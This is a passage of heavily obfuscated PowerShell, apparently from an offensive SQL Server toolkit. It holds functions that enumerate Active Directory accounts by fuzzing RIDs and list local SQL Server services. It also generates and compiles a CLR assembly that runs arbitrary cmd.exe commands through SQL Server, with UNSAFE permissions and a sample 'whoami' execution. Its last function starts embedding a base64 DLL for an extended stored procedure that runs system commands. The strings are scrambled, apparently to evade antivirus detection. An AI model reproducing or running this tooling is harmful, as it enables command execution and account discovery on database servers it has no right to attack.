        if(${tEstC`O`NNe`cTIoN})
        {
            if( -not ${SuPpRe`ss`Verbo`se})
            {
                &("{0}{2}{1}"-f 'Wri','bose','te-Ver') -Message ("$Instance "+': '+'Con'+'n'+'ecti'+'on '+'Succ'+'es'+'s.')                
            }
        }
        else
        {
            if( -not ${sU`ppreSsVERb`O`se})
            {
                &("{2}{1}{3}{0}"-f'ose','-V','Write','erb') -Message ("$Instance "+': '+'Connec'+'ti'+'on '+'Faile'+'d.')
            }
            return
        }

        
        ${SE`RVER`I`NFO} = &("{2}{0}{1}{4}{3}"-f'SQLS','erv','Get-','fo','erIn') -Instance ${I`NsTANCe} -Username ${u`S`ernAMe} -Password ${pa`SsW`ord} -Credential ${CR`EdEN`T`iaL} -SuppressVerbose
        ${C`Om`pUtE`RNA`ME} = ${s`ER`VEr`inFo}."C`oMPU`TerNa`mE"
        ${InS`T`An`Ce} = ${s`er`VER`InfO}."In`stA`Nce"
        if(-not ${d`oMA`IN}){
            ${DoM`AIN} = ${SERVe`RIn`FO}."dO`mAINn`Ame"
        }

        
        &("{3}{0}{4}{1}{2}"-f'ite','bo','se','Wr','-Ver') -Message ("$Instance "+': '+'E'+'nu'+'merat'+'ing '+'Act'+'i'+'ve '+'D'+'ir'+'e'+'ctory '+'acco'+'unt'+'s '+'fo'+'r '+'th'+'e '+"`"$Domain`" "+'domain.'+'..')        

        
        ${d`OmAingRO`UP} = ("$Domain\Domain "+'Admi'+'n'+'s')         
        ${doM`A`InGrO`UPs`iD} = &("{2}{0}{1}" -f't-SQLQuer','y','Ge') -Instance ${i`N`stA`NCe} -Query ('s'+'ele'+'ct '+"SUSER_SID('$DomainGroup') "+'as'+' '+'Dom'+'ainGroup'+'S'+'id') -Username ${U`S`erna`ME} -Password ${Passw`o`Rd} -Credential ${CREdE`NT`i`Al} -SuppressVerbose            
        ${dOmAi`Ng`ROuPsI`DBy`T`eS} = ${D`OM`A`INgrOUPS`iD} | &("{3}{2}{0}{1}" -f'ct-Obj','ect','e','Sel') -Property ("{2}{0}{4}{1}{3}" -f'gr','p','domain','sid','ou') -ExpandProperty ("{3}{1}{0}{4}{2}" -f'r','g','d','domain','oupsi')       
        try{
            ${d`oMa`I`NGROU`psIDsTr`Ing} =  $lCs2::("{0}{1}{2}"-f'ToStri','n','g').Invoke(${DOma`in`GR`OUPSiDBYTEs}).("{0}{1}" -f'R','eplace').Invoke('-','').("{1}{0}{2}"-f 'in','Substr','g').Invoke(0,48)
        }catch{
            &("{2}{1}{3}{0}"-f'ing','te-War','Wri','n') ("{4}{1}{0}{3}{6}{5}{2}{7}{9}{8}"-f 'ovided','r','resol',' domain did ','The p','ot ','n','ve ','y.','correctl')
            return
        }

        
        ${S`TArTiD}..${en`Did} |
        &("{0}{1}{2}{3}" -f'F','orEach-Ob','je','ct') -Process {
            
            ${PRin`C`IpalI`dh`ex} = '{0:x}' -f ${_}

            
            ${Pr`I`NcIpAL`idHExpaD1} = ${PriNc`ip`A`LIDhex} | &("{2}{0}{3}{1}" -f 'sure-O','t','Mea','bjec') -Character
            ${pr`i`NCIP`AlId`hEXpA`D2} = ${pR`In`C`ipa`LIdHExPA`D1}."c`HAr`ACTerS"

            
            If([bool](${pr`INCI`PalidH`ExpAd2}%2))
            {
                ${PrInciP`A`LidHE`xFiX} = "0$PrincipalIDHex"
            }

            
            ${gROU`pS`OfT`wo} = ${PR`In`cIPa`li`dHEXfix} -split ("{0}{1}" -f'(','..)') | &("{1}{0}{2}" -f'here-','W','Object') -FilterScript {
                ${_}
            }
            ${Gr`OUp`SOFTwoR} = ${G`RoUpsOfT`WO} | &("{0}{2}{1}"-f'Sort-Obj','t','ec') -Descending
            ${PR`INcIP`A`liDHeXfIx2} = ${gRo`UPsOfT`W`OR} -join ''

            
            ${PRin`cIp`Al`iDpAD} = ${p`RIncIPAl`i`D`HexFiX2}.("{0}{1}" -f'PadRi','ght').Invoke(8,'0')

            
            ${r`id} = "0x$DomainGroupSidString$PrincipalIDPad"

            
            ${qu`E`Ry} = ('SELE'+'CT '+' '+' '+' '+"'$ComputerName' "+'as'+' '+'[Compu'+'te'+'rName]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Inst'+'an'+'ce'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Rid' "+'a'+'s '+'[RI'+'D],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"SUSER_SNAME($Rid) "+'as'+' '+'[Dom'+'ainA'+'cco'+'unt]')

            
            ${TblRe`su`ltS} = &("{3}{1}{0}{2}" -f 'Q','L','uery','Get-SQ') -Instance ${in`S`TanCe} -Query ${q`UeRy} -Username ${U`SE`RNAme} -Password ${P`As`sWOrD} -Credential ${cr`EDE`NtIAl} -SuppressVerbose

            ${doM`A`INaCCOuNT} = ${tBl`R`esUl`TS}."D`oMaiNac`Co`UnT"
            if(${dOmA`I`N`ACCou`NT}."L`Eng`Th" -ge 2)
            {
                if( -not ${supprE`SSvEr`B`osE})
                {
                    &("{2}{1}{0}{3}"-f 'o','te-Verb','Wri','se') -Message ("$Instance "+': '+'- '+'R'+'ID '+"$Rid "+"($_) "+'re'+'sol'+'ved '+'to:'+' '+"$DomainAccount")
                }
            }
            else
            {
                if( -not ${suPPr`E`sSvE`RBo`sE})
                {
                    &("{3}{0}{2}{1}{4}" -f'e-','bos','Ver','Writ','e') -Message ("$Instance "+': '+'- '+'R'+'ID '+"$Rid "+"($_) "+'resolv'+'ed'+' '+'to:'+' '+'')
                }
            }

            
            ${tB`lF`Uz`zEDACCOUnTS} = ${t`BlfU`Zz`ed`ACcouNtS} + ${tbLr`e`SULTs}
        }
    }

    End
    {
        
        ${Tb`Lf`UZz`EdACC`oUntS} |
        &("{3}{1}{0}{2}" -f'bj','lect-O','ect','Se') -Property ("{3}{0}{2}{1}"-f 'omputer','me','Na','C'), ("{1}{0}{2}"-f 'nst','I','ance'), ("{3}{4}{0}{1}{2}"-f 'i','nAccou','nt','D','oma') -Unique |
        &("{1}{2}{0}{3}"-f '-','Wher','e','Object') -FilterScript {
            ${_}."DOM`Ai`N`AcCOUnT" -notlike ''
        }
    }
}






Function gET-Compu`TeR`Na`me`F`RO`mIN`StAncE
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MandaTorY = ${f`Alse},
                VaLuEfROMpIpEliNE = ${tR`UE},
                VAlueFROmpiPelInEbYPropERtynAmE = ${t`Rue},
        hElpmeSSAGe = {"{0}{1}{2}{3}{4}"-f 'SQL',' Serv','er insta','nce','.'})]
        [string]${in`StA`NCE}
    )

    
    If (${i`NS`TAnCE})
    {
        ${CO`mP`UtERNA`ME} = ${in`s`TA`Nce}.("{1}{0}"-f 'plit','s').Invoke('\')[0].("{1}{0}" -f 'lit','sp').Invoke(',')[0]
    }
    else
    {
        ${compuTe`R`NAme} = ${E`Nv:cOmPuteR`N`AME}
    }

    Return ${co`MPuTe`RN`AMe}
}


Function  get`-sq`LServicElOc`AL
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDAtOry = ${F`AlsE},
                VaLUEfroMpipelINE = ${TR`Ue},
                vAluefroMPipElInEBYPrOPeRTyNamE = ${tr`UE},
        HELpMESsagE = {"{1}{0}{4}{2}{3}"-f 'Server ','SQL ','ce','.','instan'})]
        [string]${I`NStA`NCE},
       [Parameter(maNdaTORY = ${FaL`sE},
                ValuEFroMPiPeLine = ${t`RuE},
                VaLueFRomPipelINEBYPrOPErTYNAME = ${t`RuE},
        HeLpmeSSAGE = {"{1}{0}{2}{5}{4}{3}"-f'r for ','Filte','running','s.','rvice',' se'})]
        [switch]${rU`N`oNLY},
                [Parameter(maNdaTorY = ${F`AL`SE},
        hElPmEssagE = {"{5}{4}{1}{3}{11}{9}{0}{7}{12}{10}{2}{6}{8}" -f 'n','erbose e','ppe','r','press v','Sup','d','ct','.','rs.  Used when fu','is wra','ro','ion '})]
        [switch]${S`UpPressve`R`Bo`Se}
    )
    Begin
    {
        
        ${tbLLOcaL`i`Ns`TaNCES} = &("{0}{1}{2}" -f 'New','-Obje','ct') -TypeName ("{5}{0}{3}{1}{2}{4}"-f'yste','.Data','.','m','DataTable','S')
        ${N`ULL} = ${TbLLOcaLiN`S`Ta`NcEs}."co`l`UMNS".("{0}{1}" -f'A','dd').Invoke(("{3}{0}{2}{1}"-f'er','me','Na','Comput'))
        ${Nu`Ll} = ${t`BL`lOCa`LINstaN`CES}."col`U`mnS".("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}" -f'In','nce','sta'))
        ${n`UlL} = ${TBlLoC`AlI`NSTaNC`Es}."c`oLumNS".("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}"-f 'S','me','playNa','erviceDis'))
        ${nU`lL} = ${TBLl`O`CALin`S`TanceS}."cO`lU`mNs".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{1}" -f 'Servi','e','ceNam'))
        ${n`UlL} = ${T`BlL`OC`ALin`sTANc`es}."cO`lU`mNs".("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}"-f 'ePat','h','Servic'))
        ${N`Ull} = ${t`Bllo`CaLInST`An`cEs}."Col`UM`NS".("{1}{0}"-f'd','Ad').Invoke(("{4}{2}{3}{0}{1}" -f 'coun','t','vice','Ac','Ser'))
        ${n`ULl} = ${TBL`L`OcALINStAN`c`es}."c`OlUM`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{2}{3}{1}{0}" -f 'e','at','S','erviceSt'))
        ${nU`Ll} = ${tbllO`ca`l`i`NS`TaNCES}."c`olumNS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{3}{4}{2}" -f'Service','P','sId','ro','ces'))
    }

    Process
    {
        
        ${SQl`Ser`Vi`Ces} = &("{1}{2}{0}{3}"-f'miObje','Ge','t-W','ct') -Class ("{3}{1}{2}{0}" -f '_service','3','2','win') |
        &("{0}{1}{2}{3}" -f'W','here-','Obj','ect') -FilterScript {
            ${_}."Dis`plAYna`ME" -like ("{0}{1}{2}{3}"-f 'SQL',' ','Serv','er *')
        } |
        &("{2}{1}{4}{0}{3}"-f'ec','lect-','Se','t','Obj') -Property ("{0}{3}{2}{1}" -f'Dis','e','Nam','play'), ("{0}{2}{1}" -f'Pat','Name','h'), ("{1}{0}" -f 'me','Na'), ("{2}{1}{0}"-f'ame','N','Start'), ("{1}{0}"-f'tate','S'), ("{3}{2}{0}{1}"-f 't','emName','ys','S'), ("{0}{2}{1}" -f 'Proces','d','sI')

        
        ${SQ`LSE`RVIC`Es} |
        &("{2}{1}{0}{3}"-f'ch','a','ForE','-Object') -Process {
        
            
            ${co`Mp`UteRNA`Me} = [string]${_}."sYSte`m`NAme"
            ${D`ISp`LAYnamE} = [string]${_}."d`IsPlaY`NA`ME"
            ${sERvS`T`ATe} = [string]${_}."S`TatE"

            
            ${cURREn`Tin`St`An`ce} = ${Co`MPU`TeRNAMe}

            
            ${InSt`ANcECHE`ck} = (${DI`sPL`AyN`AMe}[1..${di`SPLaYnA`Me}."lEn`gtH"] | &("{2}{1}{0}{3}"-f'er','h','W','e-Object') {${_} -like '('})."coU`Nt"
            if(${iNStAnC`Ech`e`Ck}) {

                
                ${Cur`R`ENTinsT`AnCE} = ${CoMpU`TERN`Ame} + '\' +${d`iSPLaYn`A`me}.("{1}{0}" -f'lit','sp').Invoke('(')[1].("{0}{1}" -f 'spl','it').Invoke(')')[0]

                
                if(${Cu`Rre`Nti`NStAn`Ce} -like ((("{0}{1}{2}{3}{4}"-f'*{0}MSS','Q','LSERV','E','R'))  -F  [CHAr]92))
                {
                    ${CuRRe`NTinS`T`A`NCe} = ${com`p`UTe`R`NamE}
                }
            }
          
            
            if(${i`NstA`NCe} -and ${iNs`T`AnCe} -notlike ${CurreNt`iNSta`N`Ce}){
                return
            }

            
            if(${RuNo`N`ly} -and ${SERV`S`TAtE} -notlike ("{0}{1}" -f'Runnin','g')){
                return    
                
            }
            
            
            if(${_}."prO`c`eSSID" -eq 0){
                ${S`ErVICEp`Roc`EsSId} = ""
            }else{
                ${seRV`iC`EpROCE`ssiD} = ${_}."PrOCe`s`siD"
            }

            
            ${Nu`ll} = ${TBl`loCALIns`Ta`Nc`ES}."R`Ows"."a`Dd"(
                [string]${_}."SYsTeM`N`AmE",
                [string]${Cu`Rr`entINs`TAnCe},
                [string]${_}."DIspLA`y`NAMe",
                [string]${_}."n`AmE",
                [string]${_}."P`At`HNAME",
                [string]${_}."sTARTN`A`Me",
                [string]${_}."St`ATE",
                [string]${s`E`Rvi`cePRocEs`s`id})            
        }
    }

    End
    {
        
        ${LO`cAlin`S`TAn`cEcounT} = ${TblL`o`cAL`I`NS`TanCES}."r`owS"."CO`Unt"

        if(-not ${SUPPReS`Sv`ER`Bo`se}){
            &("{3}{2}{1}{0}" -f '-Verbose','te','i','Wr') ("$LocalInstanceCount "+'l'+'ocal'+' '+'SQL'+' '+'Se'+'rve'+'r '+'s'+'erv'+'ice'+'s '+'w'+'ere '+'foun'+'d '+'t'+'hat '+'mat'+'ched '+'th'+'e '+'cr'+'ite'+'ria.')        
        }

        
        ${TB`l`lOcal`instANc`eS} 
    }
}







function CReatE-Sq`Lfil`EClRD`ll
{
    

    [CmdletBinding()]
    Param(
        [Parameter(maNDAToRY = ${fal`se},
        heLpMEssage = {"{2}{1}{3}{0}" -f'edure name.','o','Pr','c'})]
        [string]${prOceDur`EN`A`ME} = ("{0}{1}{2}" -f'cmd','_','exec'),  

        [Parameter(maNDATory = ${f`Al`sE},
        helPMesSaGE = {"{4}{3}{6}{5}{0}{1}{2}" -f'e','s','.','ut','Directory to outp','l',' fi'})]
        [string]${oU`T`Dir} = ${Env`:te`Mp}, 

        [Parameter(maNDatORy = ${fa`L`SE},
        HeLpmessagE = {"{6}{7}{1}{3}{2}{4}{9}{10}{11}{5}{8}{0}"-f 'lt.','m',' name. ',' assembly','It ','by','Set cust','o',' defau','is ran','d','om '})]
        [string]${AssEM`BlY`NAME}, 
        
        [Parameter(MANdAtORy = ${F`AL`Se},
        HELPMeSSAGe = {"{16}{11}{12}{1}{7}{10}{0}{15}{4}{13}{8}{3}{14}{9}{2}{5}{6}" -f 'ass name. ','usto','de','ando',' i','fault','.','m assem','r','y ','bly cl','e','t c','s ','m b','It','S'})]
        [string]${AssE`mb`LYcla`SsN`AME},    
        
        [Parameter(mANDatOrY = ${FA`Lse},
        HelPMESSagE = {"{0}{7}{4}{13}{9}{1}{2}{3}{6}{11}{5}{10}{8}{12}"-f'S','thod nam','e. It is ','ra','t custom ass',' de','ndo','e','ult','me','fa','m by','.','embly '})]
        [string]${aSs`e`m`BLyMEth`ODNAme},             

        [Parameter(mANDaToRy = ${F`ALSE},
        hElPmessAGE = {"{0}{1}{3}{2}" -f 'Out','p','name.','ut '})]
        [string]${oU`TfilE} = ("{0}{1}"-f 'CLRFi','le'),
        
        [Parameter(mANDATorY = ${f`ALSE},
        HeLPmESsAGE = {"{7}{0}{12}{8}{5}{1}{10}{4}{6}{2}{9}{11}{3}"-f'ptional ',' D','o convert to ','.','L','urce',' t','O','o','asci','L','i hex','s'})]
        [string]${SOU`RCEd`Llp`AtH}
    )

    Begin
    {

        
        
        
        ${SR`Cp`AtH} = ${Ou`TdiR} + '\' + ${out`F`Ile} + ("{1}{0}" -f 'c','.cs')
        ${DLLp`A`TH} = ${O`U`TdiR} + '\' + ${o`UtFI`Le} + ("{1}{0}" -f'll','.d')
        ${cOMmA`ND`PAtH} = ${O`U`TDir} + '\' + ${o`UTFI`Le} + ("{1}{0}" -f'txt','.')

        
        if(${SOUrc`Ed`Ll`pAtH}){
            ${dLL`PA`TH} = ${s`oUrCEDl`lp`Ath}
            ${S`RcPAth} = "NA"
        }
    }

    Process 
    {

        
        &("{1}{0}{2}"-f 'e-Verb','Writ','ose') ('Tar'+'get '+'C#'+' '+' '+'Fi'+'le'+': '+"$SRCPath") 
        &("{1}{3}{2}{0}" -f'e','Write-Ve','s','rbo') ('Targ'+'et '+'D'+'LL '+'Fil'+'e:'+' '+"$DllPath")
        
        
        ${cLAsSN`AmEl`eNgTh} = (5..10 | &("{1}{0}{2}{3}"-f'et-','G','Ra','ndom') -count 1 )
        ${M`EtHoDn`A`melENg`TH} = (5..10 | &("{1}{0}{2}"-f't-Ran','Ge','dom') -count 1 )
        ${AsS`Emb`L`yLEnG`TH} = (5..10 | &("{2}{1}{0}"-f 'andom','et-R','G') -count 1 )

        
        If(-not ${a`SS`emblY`cLAssN`AmE}){                                       
            ${A`sS`EMBLYCLaSsn`Ame} = (-join ((65..90) + (97..122) | &("{2}{0}{1}"-f '-R','andom','Get') -Count ${Cl`ASSn`AMElenG`TH} | &('%') {[char]${_}}))
        }

        
        if(-not ${Ass`e`MB`LyM`et`hodNAmE}){
            ${a`S`seMblyM`e`Tho`Dname} = (-join ((65..90) + (97..122) | &("{0}{2}{1}" -f'G','andom','et-R') -Count ${mE`T`ho`dNAmel`En`gtH} | &('%') {[char]${_}}))
        }

        
        If(-not ${ASS`E`mblyN`AmE}){
            ${As`sE`MBlYN`AMe} = (-join ((65..90) + (97..122) | &("{3}{1}{2}{0}" -f 'ndom','t-','Ra','Ge') -Count ${m`E`Tho`DnAMeLEN`GTh} | &('%') {[char]${_}}))
        }

        if (-not ${SOuRCE`dllP`Ath}){
            
            
            ${TeMPL`A`TecM`D`e`xec} = @"
            using System;
            using System.Data;
            using System.Data.SqlClient;
            using System.Data.SqlTypes;
            using Microsoft.SqlServer.Server;
            using System.IO;
            using System.Diagnostics;
            using System.Text;
            public partial class $AssemblyClassName
            {
            [Microsoft.SqlServer.Server.SqlProcedure]
            public static void $AssemblyMethodName (SqlString execCommand)
            {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();

                // Create the record and specify the metadata for the columns.
	            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	            // Mark the begining of the result-set.
	            SqlContext.Pipe.SendResultsStart(record);

                // Set values for each column in the row
	            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

	            // Send the row back to the client.
	            SqlContext.Pipe.SendResultsRow(record);

	            // Mark the end of the result-set.
	            SqlContext.Pipe.SendResultsEnd();

            proc.WaitForExit();
            proc.Close();

            }
            };
"@

            
            &("{3}{1}{0}{2}" -f 'os','b','e','Write-Ver') ('W'+'ri'+'ting '+'C#'+' '+'code'+' '+'to'+' '+"$SRCPath") 
            ${Te`mplaTeCm`DeX`ec} | &("{1}{0}" -f'le','Out-Fi') ${SrcPa`TH}

            
            &("{1}{3}{2}{0}" -f 'se','W','e-Verbo','rit') ("{5}{1}{0}{4}{6}{3}{2}"-f 'ch','ear','e...',' csc.ex','ing f','S','or') 
            ${c`scPA`Th} = &("{2}{0}{3}{1}"-f'et-','ildItem','G','Ch') -Recurse ((("{0}{5}{2}{3}{1}{6}{4}" -f'C','cr','dowsh','VmMi','t.NEThVm',':hVmWin','osof'))."R`EplacE"(([cHaR]104+[cHaR]86+[cHaR]109),[sTriNg][cHaR]92)) -Filter ("{1}{0}"-f'sc.exe','c') | &("{3}{1}{2}{0}"-f 'ect','ort-','Obj','S') ("{1}{2}{0}"-f 'me','f','ullna') -Descending | &("{0}{2}{1}" -f 'S','-Object','elect') ("{1}{2}{0}" -f 'e','fu','llnam') -First 1 -ExpandProperty ("{2}{1}{0}"-f 'e','m','fullna')
            if(-not ${c`scp`ATH}){
                &("{0}{1}{2}{3}" -f 'Writ','e','-','Host') ("{1}{0}{2}{3}"-f 'exe f','No csc.','oun','d.')
                return
            }else{
                &("{1}{2}{0}"-f'se','Wri','te-Verbo') ("{2}{3}{1}{0}"-f 'd.','un','cs','c.exe fo')
            }
            
            ${c`U`RREntDIREcTO`Ry} = &("{0}{1}" -f 'pw','d')
            &('cd') ${o`UTdIR}
            ${comm`A`Nd} = ("$CSCPath "+'/tar'+'g'+'e'+'t:library'+' '+'') + ${SRC`p`Ath}                   
            
            &("{0}{1}{2}{3}"-f 'Wri','te-Ver','b','ose') ("{3}{1}{0}{4}{2}"-f' t','ng','l...','Compili','o dl')
            ${rES`U`LtS} = &("{0}{1}{2}{3}" -f'Invoke-E','xp','ress','ion') ${COM`M`And}
            &('cd') ${curR`eNtD`IRe`CtORy}
        }
        
        
        &("{0}{3}{2}{1}"-f'W','rbose','ite-Ve','r') ("{3}{1}{0}{4}{5}{2}" -f's','byte','l','Grabbing ',' from the d','l') 
        if (-not ${soURCeDl`l`Pa`TH}){

            
            ${prO`c`EduREn`AMEsP} = "$ProcedureName"
            ${ST`RiNgB`U`iLDer} = &("{1}{0}{2}"-f 'b','New-O','ject') -Type ("{7}{0}{1}{2}{3}{5}{4}{6}" -f 'em.Tex','t.S','trin','g','uilde','B','r','Syst')
            ${S`TringbU`I`lDer}."App`end"(("{1}{2}{0}{4}{3}"-f 'S','CREATE A','S','BLY [','EM')) > ${NU`ll}
            ${striNgBui`LD`ER}.("{2}{1}{0}"-f'end','p','Ap').Invoke(${aSS`emb`L`yname}) > ${NU`LL}
            ${St`RInG`BU`iLD`er}."app`enD"(('] '+'AU'+'T'+'H'+'ORIZATI'+'ON '+'['+'dbo] '+'FR'+'OM '+"`n0x")) > ${N`Ull}
            ${assE`mbL`YFiLe} = &("{2}{0}{3}{1}" -f 's','ath','re','olve-p') ${D`ll`path}
            ${fILES`TRE`AM} =  $6p5eF0::("{0}{1}" -f'Ope','nRead').Invoke(${AS`s`EMBlYfIle})
             while ((${B`YTe} = ${Files`T`REAM}.("{1}{2}{0}" -f'yte','Rea','dB').Invoke()) -gt -1) {
                ${S`TR`Ing`BuIlDEr}.("{1}{0}"-f'd','Appen').Invoke(${by`TE}.("{2}{1}{0}" -f 'ing','tr','ToS').Invoke("X2")) > ${N`UlL}
            }
            ${n`UlL} = ${sTRiN`gB`UIlD`er}.("{2}{1}{0}"-f 'pendLine','p','A').Invoke(("`nWITH "+'PER'+'MI'+'SSION_'+'SET'+' '+'= '+'U'+'NSAFE'))
            ${n`Ull} = ${stRinG`B`UIld`ER}.("{3}{2}{0}{1}" -f'dLi','ne','n','Appe').Invoke("GO")
            ${NU`lL} = ${S`TrINGBU`I`Ld`er}."aPp`e`NdLIne"(('CREA'+'TE '+'PROCE'+'D'+'URE '+"[dbo].[$ProcedureNameSp] "+'@execC'+'o'+'mmand'+' '+'NVAR'+'C'+'HAR '+'(4'+'000)'+' '+'A'+'S '+'EXT'+'ERN'+'AL '+'NA'+'ME '+"[$AssemblyName].[$AssemblyClassName].[$AssemblyMethodName];"))
            ${n`Ull} = ${St`Rin`gbu`IlDEr}.("{0}{2}{3}{1}"-f'Ap','ne','pe','ndLi').Invoke("GO")
            ${Nu`Ll} = ${S`T`RINgBu`IldEr}."a`P`PenDL`iNE"(("EXEC[dbo].[$ProcedureNameSp] "+('{0}who'+'a'+'mi'+'{0}')  -f[ChAR]39))        
            ${N`ULl} = ${StRI`N`Gb`UiLDeR}.("{2}{1}{0}"-f 'ndLine','pe','Ap').Invoke("GO")
            ${MySQlco`m`ma`Nd} = ${s`TrI`NgbuIld`Er}.("{2}{0}{1}"-f'tri','ng','ToS').Invoke() -join ""
            ${F`IL`eStReaM}.("{1}{0}"-f'ose','Cl').Invoke()
            ${F`I`leSTrEAm}.("{0}{1}{2}"-f'Disp','os','e').Invoke()
        }else{
            
            
            ${STr`inGBu`Il`deR} = &("{1}{0}{2}" -f'-Obje','New','ct') -Type ("{0}{1}{7}{5}{6}{4}{2}{3}" -f 'S','ys','uild','er','tringB','e','xt.S','tem.T')
            ${Nu`ll} = ${sTriN`gbU`iL`Der}.("{3}{0}{2}{1}"-f'p','ne','pendLi','A').Invoke(("{3}{8}{9}{7}{0}{1}{5}{11}{10}{2}{4}{6}" -f'nam','e to the','ant ','-','to repla',' on','ce','mbly ','- Change ','the asse','u w','e yo'))  
            ${NU`ll} = ${stR`In`GBUIL`der}.("{0}{3}{2}{1}" -f'App','ine','ndL','e').Invoke(("{4}{2}{3}{0}{1}" -f'TBD] FRO','M','R ASSEMBLY ','[','ALTE'))
            ${Nu`LL} = ${s`T`RI`NgBu`IldeR}.("{0}{2}{1}"-f 'Appe','d','n').Invoke("`n0x") 
            ${ASS`emB`lYFi`lE} = &("{0}{3}{2}{1}" -f 'resolv','th','a','e-p') ${d`lL`PaTH}
            ${Fi`leStr`eaM} =   (DIR vARIAble:6p5ef0 ).VAlUe::("{1}{0}{2}" -f 'pen','O','Read').Invoke(${ASsemBL`y`F`iLE})
             while ((${by`Te} = ${F`iL`esTrEAM}.("{0}{1}{2}" -f 'Re','adByt','e').Invoke()) -gt -1) {
                ${StRingB`UI`L`d`Er}.("{1}{0}"-f 'ppend','A').Invoke(${BY`Te}.("{1}{0}{2}"-f 'in','ToStr','g').Invoke("X2")) > ${NU`ll}
            }
            ${n`Ull} = ${S`Tr`IngbuIL`DER}.("{0}{1}{2}"-f 'A','ppend','Line').Invoke(("`nWITH "+'PE'+'RMISS'+'ION_SE'+'T '+'= '+'UNSAF'+'E'))
            ${N`UlL} = ${STR`i`NgBuIL`DEr}.("{1}{0}"-f 'nd','Appe').Invoke("")
            ${M`YsQlCOmm`A`Nd} = ${strI`N`gBUI`LDEr}.("{2}{0}{1}"-f'r','ing','ToSt').Invoke() -join ""
            ${F`IL`ESTreAM}.("{0}{1}"-f'Cl','ose').Invoke()
            ${fILESTR`e`AM}.("{1}{0}" -f 'se','Dispo').Invoke()

        }

        
        &("{1}{0}{2}"-f'bo','Write-Ver','se') ('Wr'+'itin'+'g '+'SQ'+'L '+'to'+': '+"$CommandPath")
        ${MYs`QL`cOMManD} | &("{2}{1}{0}" -f 'ile','ut-F','O') ${COMMA`ND`p`ATH} 

        
        &("{1}{0}{2}"-f'Hos','Write-','t') ('C'+'# '+'Fi'+'le'+': '+"$SRCPath")
        &("{2}{3}{1}{0}"-f't','s','W','rite-Ho') ('C'+'LR '+'DLL'+': '+"$DllPath")
        &("{0}{2}{1}" -f'Wr','st','ite-Ho') ('SQ'+'L '+'Cm'+'d: '+"$CommandPath")        
    }
    
    End 
    {
    }
}





function cReATe`-S`qlFi`l`eXPdLL
{
    

    [CmdletBinding()]
    Param(

        [Parameter(MANdaTOry = ${F`AlSe},
        HElPMesSage = {"{2}{3}{1}{0}{4}{5}"-f 'system co','ating ','Op','er','mma','nd to run.'})]
        [string]${c`Omm`AnD},

        [Parameter(maNDAtoRY = ${F`ALsE},
        hElPMEsSAge = {"{2}{4}{3}{0}{1}{5}"-f'ed',' fun','Name','xport',' of e','ction.'})]
        [string]${E`xPor`T`NaMe},

        [Parameter(MANdatorY = ${f`Alse},
        hELPmESsagE = {"{6}{4}{5}{1}{3}{2}{0}" -f 'o.',' to wr',' t','ite','il','e','Dll f'})]
        [string]${OUT`F`iLe}
    )

    
    
    

    
    ${dllby`TE`s`64} = ("{33}{45}{83}{60}{11}{58}{72}{12}{19}{52}{4}{63}{26}{42}{2}{41}{61}{3}{59}{82}{53}{74}{20}{10}{69}{62}{35}{8}{17}{57}{44}{80}{1}{70}{7}{28}{76}{81}{5}{15}{56}{38}{49}{46}{79}{51}{39}{29}{78}{0}{50}{30}{37}{32}{68}{65}{25}{9}{55}{75}{13}{43}{14}{23}{64}{47}{24}{21}{77}{40}{66}{6}{16}{27}{48}{18}{31}{54}{34}{71}{22}{73}{67}{36}"-f 'SFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRV','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz','i0wkIEgDyEiLwUiJRCQoSItEJCiBOFBFAAB0BDLA60RIi0QkKA+3QBg9CwIAAHQEMsDrMEiLRCQog7iEAAAADncEMsDrHrgIAAAASGvADkiLTCQog7wBiAAAAAB1B